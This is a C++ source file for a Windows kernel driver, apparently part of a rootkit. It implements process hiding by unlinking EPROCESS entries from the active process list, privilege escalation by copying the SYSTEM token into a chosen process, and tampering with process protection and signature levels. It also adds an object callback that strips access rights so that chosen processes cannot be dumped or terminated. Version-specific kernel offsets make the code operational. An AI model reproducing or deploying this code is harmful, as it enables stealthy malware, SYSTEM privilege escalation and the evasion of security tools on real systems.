#pragma once
#include "pch.h"

// Definitions.
#define SYSTEM_PROCESS_PID	  0x4
#define PROCESS_TERMINATE	  0x1
#define PROCESS_CREATE_THREAD 0x2
#define PROCESS_VM_READ		  0x10
#define PROCESS_VM_OPERATION  0x8

// Prototypes.
bool FindProcess(ULONG pid);
bool AddProcess(ULONG pid);
bool RemoveProcess(ULONG pid);
ULONG GetActiveProcessLinksOffset();
ULONG GetProcessLock();
void RemoveProcessLinks(PLIST_ENTRY current);
UINT64 GetTokenOffset();
NTSTATUS ElevateProcess(ULONG pid);
ULONG GetSignatureLevelOffset();
NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	if (pGlobals.ProtectedProcesses.PidsCount == 0)
		return OB_PREOP_SUCCESS;

	auto Process = (PEPROCESS)Info->Object;
	auto pid = HandleToULong(PsGetProcessId(Process));


	AutoLock locker(pGlobals.Lock);

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (FindProcess(pid)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS HideProcess(ULONG pid) {
	// Getting the offset depending on the OS version.
	ULONG pidOffset = GetActiveProcessLinksOffset();

	if (pidOffset == STATUS_UNSUCCESSFUL) {
		return STATUS_UNSUCCESSFUL;
	}
	ULONG listOffset = pidOffset + sizeof(INT_PTR);

	// Enumerating the EPROCESSes and finding the target pid.
	PEPROCESS currentEProcess = PsGetCurrentProcess();
	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)currentEProcess + listOffset);
	ExAcquirePushLockExclusive(listLock);

	if (*(UINT32*)currentPid == pid) {
		RemoveProcessLinks(currentList);
		ExReleasePushLockExclusive(listLock);
		return STATUS_SUCCESS;
	}

	PEPROCESS StartProcess = currentEProcess;

	currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
	currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
	currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
	{
		if (*(UINT32*)currentPid == pid) {
			RemoveProcessLinks(currentList);
			ExReleasePushLockExclusive(listLock);
			return STATUS_SUCCESS;
		}

		currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
		currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
	}

	ExReleasePushLockExclusive(listLock);
	return STATUS_UNSUCCESSFUL;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
NTSTATUS ElevateProcess(ULONG pid) {
	PEPROCESS privilegedProcess, targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status))
		return status;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status))
	{
		ObDereferenceObject(targetProcess);
		return status;
	}

	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to search.
*
* Returns:
* @status [bool]  -- Whether found or not.
*/
bool FindProcess(ULONG pid) {
	for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++)
		if (pGlobals.ProtectedProcesses.Processes[i] == pid)
			return true;
	return false;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool AddProcess(ULONG pid) {
	for (int i = 0; i < MAX_PIDS; i++)
		if (pGlobals.ProtectedProcesses.Processes[i] == 0) {
			pGlobals.ProtectedProcesses.Processes[i] = pid;
			pGlobals.ProtectedProcesses.PidsCount++;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to remove.
*
* Returns:
* @status [bool]  -- Whether successfully removed or not.
*/
bool RemoveProcess(ULONG pid) {
	for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++)
		if (pGlobals.ProtectedProcesses.Processes[i] == pid) {
			pGlobals.ProtectedProcesses.Processes[i] = 0;
			pGlobals.ProtectedProcesses.PidsCount--;
			return true;
		}
	return false;
}

/*
* Description:
* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @activeProcessLinks [ULONG] -- Offset of active process links.
*/
ULONG GetActiveProcessLinksOffset() {
	ULONG activeProcessLinks = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1903:
		case WIN_1909:
			activeProcessLinks = 0x2f0;
			break;
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			activeProcessLinks = 0x2e8;
			break;
		default:
			activeProcessLinks = 0x448;
			break;
		}
	}

	return activeProcessLinks;
}


/*
* Description:
* GetActiveProcessLinksOffset is responsible for getting the ProcessLock offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @processLock [ULONG] -- Offset of ProcessLock.
*/
ULONG GetProcessLock() {
	ULONG processLock = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			processLock = 0x2d8;
			break;
		case WIN_1903:
		case WIN_1909:
			processLock = 0x2e0;
			break;
		default:
			processLock = 0x438;
			break;
		}
	}

	return processLock;
}

/*
* Description:
* RemoveProcessLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
* that "removing" the current entry.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void RemoveProcessLinks(PLIST_ENTRY current) {
	PLIST_ENTRY previous, next;

	/*
	* Changing the list from:
	* Prev <--> Current <--> Next
	*
	* To:
	*
	*   | ------------------------------
	*   v							   |
	* Prev        Current            Next
	*   |							   ^
	*   -------------------------------|
	*/

	previous = (current->Blink);
	next = (current->Flink);

	previous->Flink = next;
	next->Blink = previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;
}

/*
* Description:
* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @tokenOffset [UINT64] -- Offset of the main thread's token.
*/
UINT64 GetTokenOffset() {
	UINT64 tokenOffset = (UINT64)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1903:
		case WIN_1909:
			tokenOffset = 0x360;
			break;
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			tokenOffset = 0x358;
			break;
		default:
			tokenOffset = 0x4b8;
			break;
		}
	}

	return tokenOffset;
}

/*
* Description:
* GetSignatureLevelOffset is responsible for getting the signature level offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @signatureLevelOffset [UINT64] -- Offset of the process' signature level.
*/
ULONG GetSignatureLevelOffset() {
	ULONG signatureLevelOffset = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1903:
		case WIN_1909:
			signatureLevelOffset = 0x6f8;
			break;
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			signatureLevelOffset = 0x6c8;
			break;
		case WIN_1607:
			signatureLevelOffset = 0x6c0;
			break;
		case WIN_1511:
			signatureLevelOffset = 0x6b0;
			break;
		case WIN_1507:
			signatureLevelOffset = 0x6a8;
			break;
		default:
			signatureLevelOffset = 0x878;
			break;
		}
	}

	return signatureLevelOffset;
}

/*
* Description:
* SetProcessSignature is responsible for removing or adding process protection to a certain process.
*
* Parameters:
* @pid	   [ULONG]    -- The id of the process that need to add or remove protection to.
* @protect [bool]     -- Whether to add or remove the protection.
*
* Returns:
* @status  [NTSTATUS] -- Whether the operation was successful or not.
*/
NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature) {
	PEPROCESS process;
	NTSTATUS status = STATUS_SUCCESS;

	status = PsLookupProcessByProcessId(ULongToHandle(ProcessSignature->Pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	UCHAR newSignatureLevel = (ProcessSignature->SignerType << 4) | ProcessSignature->SignatureSigner;
	PPROCESS_SIGNATURE processSignature = (PPROCESS_SIGNATURE)(UINT64(process) + GetSignatureLevelOffset());

	processSignature->SignatureLevel = newSignatureLevel;
	processSignature->Protection.Type = ProcessSignature->SignerType;
	processSignature->Protection.Signer = ProcessSignature->SignatureSigner;

	ObDereferenceObject(process);
	return status;
}
